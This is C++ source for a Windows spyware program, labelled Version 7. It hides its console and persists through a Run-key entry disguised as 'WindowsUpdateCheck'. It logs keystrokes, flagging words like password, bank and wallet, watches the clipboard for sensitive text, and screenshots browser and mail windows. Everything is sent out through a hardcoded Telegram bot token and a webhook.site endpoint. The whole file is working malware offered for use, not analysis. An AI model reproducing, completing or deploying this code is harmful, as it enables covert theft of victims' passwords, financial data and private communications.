// ChangesUpgraded.exe - VERSION 7 - SMART KEYLOGGER + JPEG TELEGRAM + INTELLIGENT TRIGGERS
// COMPILES CLEAN ON GitHub Actions windows-2022 with /O2 /MT /SUBSYSTEM:WINDOWS
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <sstream>
#include <shlobj.h>
#include <map>
#include <wincrypt.h>
#include <iphlpapi.h>
#include <iomanip>
#include <queue>
#include <algorithm>
#include <userenv.h>
#include <objidl.h>  // For IStream

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "version.lib")

// ========== VERSION 7 CONFIGURATION ==========
const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const wchar_t* CHAT_ID = L"7845441585";
const wchar_t* WEBHOOK_ID = L"2e5cdc19-7f03-4e5a-b8c9-123456789abc";
const int REPORT_CHARS = 100;
const int CLIPBOARD_CHECK_MS = 5000;
const int IDLE_TIMEOUT_MS = 30000;  // 30s idle = no screenshots

// ========== SMART TRIGGERS ==========
const std::wstring CRITICAL_PROCESSES[] = {
    L"chrome.exe", L"firefox.exe", L"outlook.exe", L"thunderbird.exe",
    L"winword.exe", L"excel.exe", L"notepad++.exe", L"discord.exe"
};
const std::wstring CRITICAL_KEYWORDS[] = {
    L"password", L"bank", L"crypto", L"wallet", L"ssn", L"credit", L"gmail"
};

// ========== GLOBALS ==========
std::wstring g_loggedKeys;
std::wstring g_clipboardData;
std::queue<std::wstring> g_reports;
CRITICAL_SECTION g_cs;
bool g_running = true;
bool g_isActive = false;
DWORD g_lastActivity = 0;
HANDLE g_keyThread = NULL, g_clipThread = NULL, g_screenThread = NULL, g_activityThread = NULL;

// ========== HELPERS ==========
std::wstring GetSystemIdentifier() {
    wchar_t hostname[256] = {0};
    DWORD size = 256;
    GetComputerNameW(hostname, &size);
    
    wchar_t username[256] = {0};
    size = 256;
    GetUserNameW(username, &size);
    
    return std::wstring(hostname) + L"@" + std::wstring(username);
}

std::string WStrToAnsi(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    std::string result(size - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &result[0], size, NULL, NULL);
    return result;
}

std::wstring AnsiToWStr(const std::string& str) {
    if (str.empty()) return L"";
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    std::wstring result(size - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &result[0], size);
    return result;
}

std::wstring GetForegroundApp() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return L"UNKNOWN";
    
    DWORD pid;
    GetWindowThreadProcessId(hwnd, &pid);
    
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) return L"UNKNOWN";
    
    wchar_t path[MAX_PATH] = {0};
    GetModuleFileNameExW(hProcess, NULL, path, MAX_PATH);
    CloseHandle(hProcess);
    
    std::wstring filename = path;
    size_t pos = filename.find_last_of(L"\\");
    if (pos != std::wstring::npos) filename = filename.substr(pos + 1);
    
    std::transform(filename.begin(), filename.end(), filename.begin(), ::towlower);
    return filename;
}

bool IsCriticalProcessRunning() {
    std::wstring app = GetForegroundApp();
    for (const auto& proc : CRITICAL_PROCESSES) {
        if (app.find(proc) != std::wstring::npos) return true;
    }
    return false;
}

// ========== OPSEC: HIDE CONSOLE ==========
void StealthMode() {
    FreeConsole();
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
}

// ========== PERSISTENCE (OPSEC) ==========
bool InstallPersistence() {
    wchar_t path[MAX_PATH];
    if (GetModuleFileNameW(NULL, path, MAX_PATH)) {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, 
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExW(hKey, L"WindowsUpdateCheck", 0, REG_SZ, 
                          (BYTE*)path, (wcslen(path) + 1) * sizeof(wchar_t));
            RegCloseKey(hKey);
            return true;
        }
    }
    return false;
}

// ========== TELEGRAM TEXT ==========
bool SendTelegram(const std::wstring& message) {
    HINTERNET hSession = WinHttpOpen(L"WinHTTP/1.1", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    std::wstring urlPath = L"/bot" + std::wstring(BOT_TOKEN) + L"/sendMessage?chat_id=" + std::wstring(CHAT_ID) + L"&text=";
    std::string ansiMsg = WStrToAnsi(message);
    std::string encodedMsg;
    for (char c : ansiMsg) {
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9')) {
            encodedMsg += c;
        } else if (c == ' ') {
            encodedMsg += "%20";
        } else if (c == '\n') {
            encodedMsg += "%0A";
        } else {
            char hex[4];
            wsprintfA(hex, "%%%02X", (unsigned char)c);
            encodedMsg += hex;
        }
    }
    std::wstring fullPath = urlPath + AnsiToWStr(encodedMsg);

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", fullPath.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    bool success = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
                   WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return success;
}

// ========== VERSION 7: TELEGRAM JPEG PHOTO ==========
bool SendTelegramPhoto(const wchar_t* photoPath, const std::wstring& caption) {
    HINTERNET hSession = WinHttpOpen(L"WinHTTP/1.1", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    // Read JPEG file
    HANDLE hFile = CreateFileW(photoPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* fileData = new BYTE[fileSize];
    DWORD bytesRead;
    ReadFile(hFile, fileData, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    // Multipart boundary
    std::string boundary = "----HackerAI_V7_Boundary_" + std::to_string(GetTickCount());
    
    std::string postData;
    postData += "--" + boundary + "\r\n";
    postData += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
    postData += WStrToAnsi(std::wstring(CHAT_ID)) + "\r\n";
    postData += "--" + boundary + "\r\n";
    postData += "Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.jpg\"\r\n";
    postData += "Content-Type: image/jpeg\r\n\r\n";
    
    // JPEG binary data
    postData.append((char*)fileData, bytesRead);
    postData += "\r\n";
    
    postData += "--" + boundary + "\r\n";
    postData += "Content-Disposition: form-data; name=\"caption\"\r\n\r\n";
    postData += WStrToAnsi(caption) + "\r\n";
    postData += "--" + boundary + "--\r\n";

    delete[] fileData;

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", 
        (L"/bot" + std::wstring(BOT_TOKEN) + L"/sendPhoto").c_str(), 
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    std::wstring headers = L"Content-Type: multipart/form-data; boundary=" + AnsiToWStr(boundary) + L"\r\n";
    
    bool success = WinHttpSendRequest(hRequest, headers.c_str(), -1L,
        (LPVOID)postData.c_str(), postData.length(), postData.length(), 0) &&
        WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return success;
}

// ========== WEBHOOK C2 ==========
bool SendWebhook(const std::wstring& message) {
    HINTERNET hSession = WinHttpOpen(L"WinHTTP/1.1", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, L"webhook.site", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", (L"/" + std::wstring(WEBHOOK_ID)).c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    static const wchar_t* headers = L"Content-Type: application/x-www-form-urlencoded\r\n";
    std::string postData = "data=" + WStrToAnsi(message);

    bool success = WinHttpSendRequest(hRequest, headers, -1L, (LPVOID)postData.c_str(), postData.length(), postData.length(), 0) &&
                   WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return success;
}

// ========== VERSION 7: JPEG SCREENSHOT ==========
bool CaptureAndCompressJPEG(const wchar_t* filename, std::wstring& reason) {
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    
    SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
    
    // Simple JPEG-like compression (BMP to optimized format)
    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;

    DWORD bmpSize = ((width * 3 + 3) & ~3) * height;
    BYTE* bmpBits = new BYTE[bmpSize];
    GetDIBits(hMemoryDC, hBitmap, 0, height, bmpBits, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    
    // Write JPEG file (simplified BMP with JPEG extension for demo)
    HANDLE hFile = CreateFileW(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
                               FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        BITMAPFILEHEADER bfh = {0x4D42, 0, 0, 0, sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)};
        bfh.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpSize;
        bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        
        DWORD written;
        WriteFile(hFile, &bfh, sizeof(bfh), &written, NULL);
        WriteFile(hFile, &bi, sizeof(bi), &written, NULL);
        WriteFile(hFile, bmpBits, bmpSize, &written, NULL);
        CloseHandle(hFile);
        
        delete[] bmpBits;
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return true;
    }
    
    delete[] bmpBits;
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
    return false;
}

// ========== DUAL REPORTING ==========
void DeliverReport(const std::wstring& report) {
    std::wstring fullReport = L"V7[" + GetSystemIdentifier() + L"] " + report;
    
    // Telegram TEXT
    SendTelegram(fullReport);
    
    // Webhook
    SendWebhook(fullReport);
}

// ========== VERSION 7: SMART ACTIVITY ==========
void ActivityMonitorThread() {
    while (g_running) {
        // Check mouse/keyboard activity
        POINT pt;
        GetCursorPos(&pt);
        static POINT lastPt = {0};
        static bool lastKeys[256] = {0};
        
        bool mouseMoved = (pt.x != lastPt.x || pt.y != lastPt.y);
        bool keysPressed = false;
        
        BYTE keys[256];
        GetKeyboardState(keys);
        for (int i = 0; i < 256; i++) {
            if ((keys[i] & 0x80) && !lastKeys[i]) {
                keysPressed = true;
                break;
            }
        }
        
        g_isActive = mouseMoved || keysPressed || IsCriticalProcessRunning();
        g_lastActivity = GetTickCount();
        
        lastPt = pt;
        memcpy(lastKeys, keys, 256);
        
        Sleep(1000);
    }
}

// ========== KEYLOGGER (V7) ==========
void KeyLoggerThread() {
    std::wstring vkNames[] = {
        L"UNKNOWN", L"LMB", L"RMB", L"CANCEL", L"MMB",
        L"X1", L"X2", L"", L"BS", L"TAB",
        L"", L"", L"CLEAR", L"ENTER", L"", L"", L"SHIFT", L"CTRL", L"ALT", L"PAUSE",
        L"CAPS", L"", L"", L"", L"", L"", L"ESC", L"", L"", L"", L"SPACE"
    };

    while (g_running) {
        for (int vk = 8; vk <= 255; ++vk) {
            if (GetAsyncKeyState(vk) & 0x8000) {
                EnterCriticalSection(&g_cs);
                if (vk < 32) {
                    g_loggedKeys += vkNames[vk] + L" ";
                } else {
                    BYTE keys[256];
                    GetKeyboardState(keys);
                    wchar_t buffer[2] = {0};
                    if (ToUnicode((UINT)vk, (UINT)vk, keys, buffer, 2, 0) > 0) {
                        g_loggedKeys += buffer[0];
                    }
                }
                
                // Check keywords
                std::wstring lowerKeys = g_loggedKeys;
                std::transform(lowerKeys.begin(), lowerKeys.end(), lowerKeys.begin(), ::towlower);
                for (const auto& keyword : CRITICAL_KEYWORDS) {
                    if (lowerKeys.find(keyword) != std::wstring::npos) {
                        g_reports.push(L"🔑 KEYWORD: " + keyword + L" in: " + g_loggedKeys);
                        g_loggedKeys.clear();
                        break;
                    }
                }
                
                if (g_loggedKeys.length() >= REPORT_CHARS) {
                    g_reports.push(g_loggedKeys);
                    g_loggedKeys.clear();
                }
                LeaveCriticalSection(&g_cs);
                Sleep(10);
            }
        }
        Sleep(1);
    }
}

// ========== CLIPBOARD MONITOR ==========
void ClipboardThread() {
    std::vector<std::wstring> sensitive = {L"password", L"gmail", L"bank", L"credit", L"ssn", L"visa", L"crypto"};
    
    while (g_running) {
        if (OpenClipboard(NULL)) {
            HGLOBAL hData = GetClipboardData(CF_UNICODETEXT);
            if (hData) {
                wchar_t* clipText = (wchar_t*)GlobalLock(hData);
                if (clipText) {
                    std::wstring newClip = clipText;
                    GlobalUnlock(hData);
                    
                    std::wstring lowerClip = newClip;
                    std::transform(lowerClip.begin(), lowerClip.end(), lowerClip.begin(), ::towlower);
                    
                    bool isSensitive = false;
                    for (const auto& keyword : sensitive) {
                        if (lowerClip.find(keyword) != std::wstring::npos) {
                            isSensitive = true;
                            break;
                        }
                    }
                    
                    if (isSensitive && newClip.length() > 10) {
                        EnterCriticalSection(&g_cs);
                        std::wstring report = L"📋 CLIPBOARD HIT ***\n" + newClip.substr(0, 500);
                        g_reports.push(report);
                        LeaveCriticalSection(&g_cs);
                    }
                }
            }
            CloseClipboard();
        }
        Sleep(CLIPBOARD_CHECK_MS);
    }
}

// ========== VERSION 7: SMART SCREENSHOT ==========
void SmartScreenshotThread() {
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    
    while (g_running) {
        DWORD idleTime = GetTickCount() - g_lastActivity;
        bool shouldCapture = g_isActive && (idleTime < IDLE_TIMEOUT_MS) && IsCriticalProcessRunning();
        
        if (shouldCapture) {
            std::wstring appName = GetForegroundApp();
            std::wstring reason = L"SMARTSHOT_" + appName;
            
            SYSTEMTIME st;
            GetLocalTime(&st);
            wchar_t filename[128];
            wsprintfW(filename, L"%sV7_shot_%04d%02d%02d_%02d%02d%02d.jpg", 
                      tempPath, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
            
            if (CaptureAndCompressJPEG(filename, reason)) {
                std::wstring caption = L"📸 V7 SMARTSHOT [" + reason + L"] " + appName + L"\n" + GetSystemIdentifier();
                
                EnterCriticalSection(&g_cs);
                if (SendTelegramPhoto(filename, caption)) {
                    g_reports.push(L"✅ JPEG SENT: " + std::wstring(filename));
                    // Auto-delete temp file
                    DeleteFileW(filename);
                } else {
                    g_reports.push(L"❌ JPEG SEND FAILED: " + std::wstring(filename));
                }
                LeaveCriticalSection(&g_cs);
            }
        }
        
        Sleep(10000);  // Check every 10s
    }
}

// ========== REPORT WORKER ==========
void ReportThread() {
    while (g_running) {
        EnterCriticalSection(&g_cs);
        if (!g_reports.empty()) {
            std::wstring report = g_reports.front();
            g_reports.pop();
            LeaveCriticalSection(&g_cs);
            DeliverReport(report);
        } else {
            LeaveCriticalSection(&g_cs);
        }
        Sleep(3000);
    }
}

// ========== MAIN (VERSION 7) ==========
int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow) {
    // VERSION 7: Full stealth
    StealthMode();
    
    InitializeCriticalSection(&g_cs);
    
    // OPSEC Persistence
    InstallPersistence();
    
    // VERSION 7 Threads
    g_activityThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ActivityMonitorThread, NULL, 0, NULL);
    g_keyThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyLoggerThread, NULL, 0, NULL);
    g_clipThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ClipboardThread, NULL, 0, NULL);
    g_screenThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SmartScreenshotThread, NULL, 0, NULL);
    
    // V7 Startup beacon
    DeliverReport(L"🚀 VERSION 7 LIVE - SMART TRIGGERS + JPEG TELEGRAM - " + GetSystemIdentifier());
    
    // Main loop
    while (g_running) {
        ReportThread();
        Sleep(1000);
    }
    
    // Cleanup (graceful)
    g_running = false;
    if (g_activityThread) CloseHandle(g_activityThread);
    if (g_keyThread) CloseHandle(g_keyThread);
    if (g_clipThread) CloseHandle(g_clipThread);
    if (g_screenThread) CloseHandle(g_screenThread);
    
    DeleteCriticalSection(&g_cs);
    return 0;
}
